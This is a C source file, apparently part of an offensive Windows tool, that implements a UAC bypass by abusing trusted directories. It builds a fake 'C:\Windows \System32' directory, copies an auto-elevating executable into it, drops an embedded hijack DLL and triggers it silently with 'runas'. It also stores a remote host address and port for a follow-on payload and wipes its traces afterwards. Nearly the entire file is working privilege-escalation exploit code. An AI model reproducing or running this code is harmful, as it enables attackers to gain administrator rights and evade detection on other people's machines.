#include <windows.h>
#include <stdio.h>
#include <strsafe.h>

#include "tools.h"
#include "TargetDll.h"
#include "resource.h"
#include "Message.h"
#include "DropFile.h"

#include "LoadAPI.h"

#if _WIN64
#include "UacBypassDll64.h"
#else
#include "UacBypassDll32.h"
#endif*/

BOOL CheckExploit(Advapi32_API advapi, char* exeName, char* dllName) {
    BOOL result = FALSE;

    char* buffer = (char*)malloc(MAX_PATH);
    if (buffer != NULL) {
        const char* regKey = "Software\\Wincat";

        if (ReadRegistryValue(advapi,HKEY_CURRENT_USER, (char*)regKey, "test", buffer, MAX_PATH)) {
            result = strcmp(buffer, "1") == 0;
            Sleep(1000);
            if (!RegDelnodeRecurse(advapi,HKEY_CURRENT_USER, (char*)regKey))
                printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Fail to clear reg key: HKCU:%s", regKey);
        }
        free(buffer);
    }
    else
        printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Failed to allocate memory");
    return result;
};


BOOL CreateFakeDirectory(char* system32FakePath) {
    const char* dir1 = "C:\\Windows \\";

    if (!CreateDirectoryA(dir1, NULL)) {
        DWORD lastError = GetLastError();
        if (lastError != ERROR_ALREADY_EXISTS) {
            printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Failed to create directory: %s", dir1);
            return FALSE;
        }
    }
    if (!CreateDirectoryA(system32FakePath, NULL)) {
        DWORD lastError = GetLastError();
        if (lastError != ERROR_ALREADY_EXISTS) {
            printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Failed to create directory : %s", system32FakePath);
            return FALSE;
        }
    }
    return TRUE;
}

BOOL CopyExeFile(char* system32Path, char* fakeSystemDir, char* fileName) {
    char* fullPathInt = (char*)malloc(MAX_PATH);
    if (fullPathInt == NULL) {
        printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Failed to allocate memory");
        return FALSE;
    }
    char* fullPathOut = (char*)malloc(MAX_PATH);
    if (fullPathOut == NULL) {
        printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Failed to allocate memory");
        free(fullPathInt);
        return FALSE;
    }
    sprintf_s(fullPathInt, MAX_PATH, "%s\\%s", system32Path, fileName);
    sprintf_s(fullPathOut, MAX_PATH, "%s\\%s", fakeSystemDir, fileName);
    if (!CopyFileA(fullPathInt, fullPathOut, FALSE)) {
        printMsg(STATUS_ERROR2, LEVEL_VERBOSE, "Failed to copy file: %s -> %s", fullPathInt, fullPathOut);
        free(fullPathOut);
        free(fullPathInt);
        return FALSE;
    }
    printMsg(STATUS_INFO2, LEVEL_VERBOSE, "File copied: %s -> %s \n", fullPathInt, fullPathOut);

    free(fullPathOut);
    free(fullPathInt);
    return TRUE;
}

BOOL DropDllFile(Kernel32_API kernel32, Cabinet_API cabinetAPI, char* fakeSystemDir, char* fileName) {
    BOOL result;
#if _WIN64
    StrucFile dllToDrop = { L"",UAC_BYPASS_DLL_64,FILE_SIZE_UAC_BYPASS_DLL_64,TRUE,TRUE };
#else
    StrucFile dllToDrop = { L"",UAC_BYPASS_DLL_32,FILE_SIZE_UAC_BYPASS_DLL_32,TRUE,TRUE };
#endif

    WCHAR* wFilename = (WCHAR*)calloc(MAX_PATH + 1, sizeof(WCHAR));
    if (wFilename == NULL) {
        printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Failed to allocate memory");
        return FALSE;
    }
    swprintf_s(wFilename, MAX_PATH + 1, L"%hs", fileName);
    dllToDrop.filename = wFilename;

    result = DropFile(kernel32, cabinetAPI,fakeSystemDir, dllToDrop);

    free(wFilename);
    return result;
}



BOOL Trigger(Shell32_API shell32, char* fakeSystemDir, char* fileName) {
    SHELLEXECUTEINFOA sinfo = { 0 };

    char* fullPath = (char*)malloc(MAX_PATH);
    if (fullPath == NULL) {
        printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Failed to allocate memory");
        return FALSE;
    }
    sprintf_s(fullPath, MAX_PATH, "%s\\%s", fakeSystemDir, fileName);
    printMsg(STATUS_INFO2, LEVEL_DEFAULT, "Triggering: %s\n", fullPath);

    sinfo.cbSize = sizeof(SHELLEXECUTEINFOA);
    sinfo.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
    sinfo.hwnd = NULL;
    sinfo.lpVerb = "runas";
    sinfo.lpFile = fullPath;
    sinfo.lpParameters = NULL;
    sinfo.lpDirectory = fakeSystemDir;
    sinfo.nShow = SW_HIDE;
    sinfo.hInstApp = NULL;

    //SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX);
    SetErrorMode(SEM_FAILCRITICALERRORS |
        SEM_NOALIGNMENTFAULTEXCEPT |
        SEM_NOGPFAULTERRORBOX |
        SEM_NOOPENFILEERRORBOX);

    if (!shell32.ShellExecuteExAF(&sinfo) || sinfo.hProcess == NULL) {
        printMsg(STATUS_ERROR2, LEVEL_VERBOSE, "Failed to create process");
        return FALSE;
    }
    if (WaitForSingleObject(sinfo.hProcess, 200) == WAIT_TIMEOUT) {
        printMsg(STATUS_INFO2, LEVEL_VERBOSE, "Process create timout: %s\n", fileName);
        if (!TerminateProcess(sinfo.hProcess, 1))
            printMsg(STATUS_ERROR2, LEVEL_VERBOSE, "Fail to terminate process: %s", fileName);
    }
    CloseHandle(sinfo.hProcess);

    free(fullPath);
    return TRUE;
}

BOOL RemoveFakeDirectory(char* fakeSystemDir) {
    if (!RemoveDirectoryA(fakeSystemDir)) {
        printMsg(STATUS_ERROR2, LEVEL_VERBOSE, "Failed to remove directory");
        return FALSE;
    }
    if (!RemoveDirectoryA("C:\\Windows \\")) {
        printMsg(STATUS_ERROR2, LEVEL_VERBOSE, "Failed to remove directory");
        return FALSE;
    }
    return TRUE;
}
BOOL CleanUpFakeDirectory(char* fakeSystemDir, char* exeName, char* dllName) {

    char* bufferFilePath = (char*)malloc(MAX_PATH);
    if (bufferFilePath == NULL)
        return FALSE;

    sprintf_s(bufferFilePath, MAX_PATH, "%s\\%s", fakeSystemDir, exeName);
    if (!DeleteFileA(bufferFilePath))
        printMsg(STATUS_ERROR2, LEVEL_VERBOSE, "Failed to delete file %s", bufferFilePath);

    sprintf_s(bufferFilePath, MAX_PATH, "%s\\%s", fakeSystemDir, dllName);
    if (!DeleteFileA(bufferFilePath))
        printMsg(STATUS_ERROR2, LEVEL_VERBOSE, "Failed to delete file %s", bufferFilePath);
    free(bufferFilePath);
    return TRUE;
}
BOOL FullCleanUp(char* fakeSystemDir) {
    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA("C:\\Windows \\System32\\*.*", &fd);
    int iFailRemove = 0;

    if (hFind == INVALID_HANDLE_VALUE) {
        printMsg(STATUS_ERROR2, LEVEL_VERBOSE, "Failed to find files in directory %s", fakeSystemDir);
        return FALSE;
    }
    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            continue;
        char* bufferFilePath = (char*)malloc(MAX_PATH);
        if (bufferFilePath == NULL)
            return FALSE;
        sprintf_s(bufferFilePath, MAX_PATH, "%s\\%s", fakeSystemDir, fd.cFileName);
        if (!DeleteFileA(bufferFilePath)) {
            printMsg(STATUS_ERROR2, LEVEL_VERBOSE, "Failed to delete file %s", bufferFilePath);
            iFailRemove++;
        }
        free(bufferFilePath);
    } while (FindNextFileA(hFind, &fd));
    FindClose(hFind);
    if (iFailRemove > 0)
        printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Failed to delete %i files (Need manual clean up)", iFailRemove);
    RemoveFakeDirectory(fakeSystemDir);
    return TRUE;
}
BOOL ExploitDT(Kernel32_API kernel32, Advapi32_API advapi32, Shell32_API shell32, Cabinet_API cabinetAPI, char* exeName, char* dllName, char* system32Path, char* fakeSystemDir) {
    if (CreateFakeDirectory(fakeSystemDir)) {
        if (CopyExeFile(system32Path, fakeSystemDir, exeName)) {
            if (DropDllFile(kernel32, cabinetAPI,fakeSystemDir, dllName)) {
                Trigger(shell32,fakeSystemDir,exeName);

                Sleep(100);
                CleanUpFakeDirectory(fakeSystemDir, exeName, dllName);
                return CheckExploit(advapi32,exeName, dllName);
            }
        }
    }
    Sleep(100);
    CleanUpFakeDirectory(fakeSystemDir, exeName, dllName);
    return FALSE;
}



BOOL GetFakeSystemPath(Kernel32_API kernel32, char** system32Path, char** fakeSystemDir) {
    *fakeSystemDir = (char*)malloc(MAX_PATH + 1);
    if (*fakeSystemDir == NULL) {
        printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Failed to allocate memory");
        return FALSE;
    }
    *system32Path = (char*)malloc(MAX_PATH + 1);
    if (*system32Path == NULL) {
        printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Failed to allocate memory");
        free(*fakeSystemDir);
        return FALSE;
    }
    if (kernel32.GetWindowsDirectoryAF(*system32Path, MAX_PATH + 1) == 0) {
        printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Failed to get system directory !");
        free(*fakeSystemDir);
        free(*system32Path);
        return FALSE;
    }
    sprintf_s(*fakeSystemDir, MAX_PATH, "%s \\System32", *system32Path);
    sprintf_s(*system32Path, MAX_PATH, "%s\\System32", *system32Path);
    return TRUE;
}



BOOL ExploitTrustedDirectories(Kernel32_API kernel32, Advapi32_API advapi32, Shell32_API shell32, Cabinet_API cabinetAPI, char* PathExeToRun, WCHAR* UipAddress, char* port) {
    BOOL exploitSuccessed = FALSE;
    char* system32Path = NULL;
    char* fakeSystemDir = NULL;

    if (!GetFakeSystemPath(kernel32, &system32Path, &fakeSystemDir))
        return FALSE;

    printMsg(STATUS_INFO2, LEVEL_DEFAULT, "System directory:\t\t'%s'\n", system32Path);
    printMsg(STATUS_INFO2, LEVEL_DEFAULT, "System fake directory:\t'%s'\n", fakeSystemDir);

    if (!SaveRHostInfo(advapi32, UipAddress, port)) {
        free(system32Path);
        free(fakeSystemDir);
        return FALSE;
    }
    if (!SaveCPathInfo(advapi32,PathExeToRun)) {
        printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Fail to save info in reg");
        free(system32Path);
        free(fakeSystemDir);
        return FALSE;
    }
    
    printMsg(STATUS_OK, LEVEL_DEFAULT, "Running exploit:\n");
    for (int i = 0; i < sizeof(dllList) / sizeof(DllList) && !exploitSuccessed; i++) {
        for (int j = 0; j < dllList[i].tableSize && !exploitSuccessed; j++) {
            printMsg(STATUS_OK2, LEVEL_DEFAULT, "Target: %s -> %s\n", dllList[i].name, dllList[i].dllTable[j]);
            if (ExploitDT(kernel32,advapi32, shell32, cabinetAPI,(char*)dllList[i].name, (char*)dllList[i].dllTable[j], system32Path, fakeSystemDir)) {
                printMsg(STATUS_OK2, LEVEL_DEFAULT, "Vulnerable: %s -> %s\n", dllList[i].name, dllList[i].dllTable[j]);
                exploitSuccessed = TRUE;
            }
        }
    }
    FullCleanUp(fakeSystemDir);
    free(system32Path);
    free(fakeSystemDir);

    return exploitSuccessed;
}